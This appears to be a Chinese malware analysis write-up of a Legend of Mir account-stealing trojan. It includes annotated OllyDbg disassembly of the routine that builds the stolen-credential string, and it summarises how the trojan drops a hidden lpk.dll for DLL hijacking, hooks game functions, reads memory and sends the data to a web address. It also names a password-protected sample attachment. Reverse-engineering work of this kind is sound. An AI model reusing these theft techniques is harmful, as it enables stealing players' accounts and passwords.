
```
1000840B       |. 57            push edi  
1000840C       |. 50            push eax  
1000840D       |. E8 2EB30000   call <比较 cmp>  
10008412       |. 59            pop ecx  
10008413       |. 59            pop ecx  
10008414       |. 85C0          test eax, eax  
10008416       |. 0F84 EF000000  je 1000850B  
1000841C       |. 8D46 18       lea eax, dword ptr [esi+18]  
1000841F       |. 57            push edi  
10008420       |. 50            push eax  
10008421       |. E8 1AB30000   call <比较 cmp>  
10008426       |. 59            pop ecx  
10008427       |. 59            pop ecx  
10008428       |. 68 A0390210   push 100239A0               ; hxlchuaqia  
1000842D       |. 53            push ebx  
1000842E       |. 53            push ebx  
1000842F       |. 8945 DC       mov [local.9], eax  
10008432       |. FF15 E4C20210 call dword ptr [1002C2E4]  
10008438       |. 6A 32         push 32  
1000843A       |. 53            push ebx  
1000843B       |. BF C4120310   mov edi, 100312C4  
10008440       |. 57            push edi  
10008441       |. C705 5C170310 0>mov dword ptr [1003175C], 1  
1000844B       |. E8 E0980000   call <清理一块内存空间出来>  
10008450       |. 6A 03         push 3  
10008452       |. 8D46 18       lea eax, dword ptr [esi+18]  
........  
100084E8       |> \53          push ebx  
100084E9       |. 53            push ebx  
100084EA       |. 53            push ebx  
100084EB       |. 68 946C0010   push 10006C94         //传奇线程  
100084F0       |. 53            push ebx  
100084F1       |. 53            push ebx  
100084F2       |. FF15 5CC70210 call dword ptr [1002C75C]  
100084F8       |. 50            push eax  
100084F9       |. FF15 8C100310 call dword ptr [1003108C]  
100084FF       |. 8B0D 54C60210 mov ecx, dword ptr [1002C654]  
10008505       |. 33C0          xor eax, eax  
10008507       |. 66:8941 10    mov word ptr [ecx+10], ax  
1000850B       |>  68 88390210   push 10023988         ; => tuichum  
10008510       |. 8D7E 18       lea edi, dword ptr [esi+18]  
10008513       |. 57            push edi  
10008514       |. E8 27B20000   call <比较 cmp>  
10008519       |. 59            pop ecx  
1000851A       |. 59            pop ecx  
1000851B       |. 85C0          test eax, eax  
1000851D       |. 74 06         je short 10008525  
1000851F       |. 53            push ebx  
10008520       |. E8 11CD0000   call 10015236  
10008525       |>  68 78390210   push 10023978         ; => zhuangyuanm  
```

### 传奇线程

```
10006C94       /. 55            push ebp  
10006C95       |. 8BEC          mov ebp, esp  
10006C97       |. 81EC 08010000 sub esp, 108  
10006C9D       |. A1 60B00210   mov eax, dword ptr [1002B060]  
10006CA2       |. 33C5          xor eax, ebp  
10006CA4       |. 8945 FC       mov [local.1], eax  
10006CA7       |. 833D 5C170310 0>cmp dword ptr [1003175C], 0  
10006CAE       |. 0F84 1F010000 je 10006DD3  
10006CB4       |. 53            push ebx  
10006CB5       |. 56            push esi  
10006CB6       |. E8 59FFFFFF   call 10006C14  
10006CBB       |. BE 00010000   mov esi, 100  
10006CC0       |. 56            push esi  
10006CC1       |. 8D85 FCFEFFFF lea eax, [local.65]  
10006CC7       |. 6A 00         push 0  
10006CC9       |. 50            push eax  
10006CCA       |. C785 F8FEFFFF 0>mov [local.66], 10023700          ; .  
10006CD4       |. E8 57B00000   call <清理一块内存空间出来>  
10006CD9       |. 83C4 0C       add esp, 0C  
10006CDC       |. FF15 B0110310 call dword ptr [100311B0]  
10006CE2       |. 3905 44C40210 cmp dword ptr [1002C444], eax  
10006CE8       |. 74 0A         je short 10006CF4  
10006CEA       |. C785 F8FEFFFF F>mov [local.66], 100236F0          ; 切出了游戏.  
10006CF4       |>  A1 60170310   mov eax, dword ptr [10031760]  
10006CF9       |. BB E4360210   mov ebx, 100236E4       ; ,***已绑  
10006CFE       |. 83F8 01       cmp eax, 1  
10006D01       |. 74 06         je short 10006D09  
10006D03       |. 8B9D F8FEFFFF mov ebx, [local.66]  
10006D09       |>  85C0          test eax, eax  
10006D0B       |. 75 05         jnz short 10006D12  
10006D0D       |. BB DC360210   mov ebx, 100236DC       ; ,无绑  
10006D12       |>  83F8 02       cmp eax, 2  
10006D15       |. 75 05         jnz short 10006D1C  
10006D17       |. BB D0360210   mov ebx, 100236D0       ; ,人物解绑  
10006D1C       |>  83F8 03       cmp eax, 3  
10006D1F       |. 75 05         jnz short 10006D26  
10006D21       |. BB C4360210   mov ebx, 100236C4       ; ,装备解绑  
10006D26       |>  56            push esi  
10006D27       |. 8D85 FCFEFFFF lea eax, [local.65]  
10006D2D       |. 6A 00         push 0  
10006D2F       |. 50            push eax  
10006D30       |. E8 FBAF0000   call <清理一块内存空间出来>  
10006D35       |. FFB5 F8FEFFFF push [local.66]  
10006D3B       |. A1 F8140310   mov eax, dword ptr [100314F8]  
10006D40       |. 53            push ebx  
10006D41       |. FF30          push dword ptr [eax]  
10006D43       |. A1 B8DF0210   mov eax, dword ptr [1002DFB8]  
10006D48       |. FF30          push dword ptr [eax]  
10006D4A       |. A1 14160310   mov eax, dword ptr [10031614]  
10006D4F       |. FF30          push dword ptr [eax]  
10006D51       |. 8D85 FCFEFFFF lea eax, [local.65]  
10006D57       |. FF35 F0150310 push dword ptr [100315F0]  
10006D5D       |. 68 C4120310   push 100312C4  
10006D62       |. 68 A8360210   push 100236A8           ; /%s %s:%d:%d[%d]密保[%s]%s  
10006D67       |. 50            push eax  
10006D68       |. E8 59CA0000   call <字符处理函数>          
```

### 样本大致流程

1. 该样本用 `od` 加载起来后，会获取自身路径，然后和对应的游戏进程比较。
2. 释放动态链接库文件 `lpk.dll` 到游戏安装目录下，并设置文件属性为系统隐藏，通过劫持 `lpk` 加载。
3. 通过挂钩关键函数，`patch` 游戏，读取内存等方式盗取游戏账号密码。
4. 将盗取信息发送到指定网址

### 上传的附件

| ![](img/620251b33676a8e4b98ca0ece915ee8d.jpg) | 解压密码 `virus.zip` |
|--------------------------------------------------|---------------------|
